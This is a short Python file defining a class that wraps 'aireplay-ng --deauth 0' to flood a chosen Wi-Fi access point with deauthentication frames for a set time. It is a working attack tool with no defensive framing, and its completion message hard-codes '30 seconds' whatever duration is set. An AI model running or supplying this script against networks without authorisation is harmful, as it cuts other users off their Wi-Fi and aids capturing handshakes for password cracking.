import subprocess
import time

class Replay:
    def __init__(self, bssid, interface, duration=30):
        self.bssid = bssid
        self.interface = interface
        self.duration = duration

    def start_aireplay(self):
        print(f"[*] Starting aireplay-ng for {self.duration} seconds...")
        aireplay_cmd = [
            "sudo", "aireplay-ng",
            "--deauth", "0",
            "-a", self.bssid,
            self.interface
        ]
        try:
            # Start the process
            process = subprocess.Popen(aireplay_cmd)
            # Wait for the specified duration
            time.sleep(self.duration)
            # Terminate the process
            process.terminate()
            print("[*] Aireplay-ng process terminated after 30 seconds.")
        except Exception as e:
            print(f"[!] An error occurred: {e}")


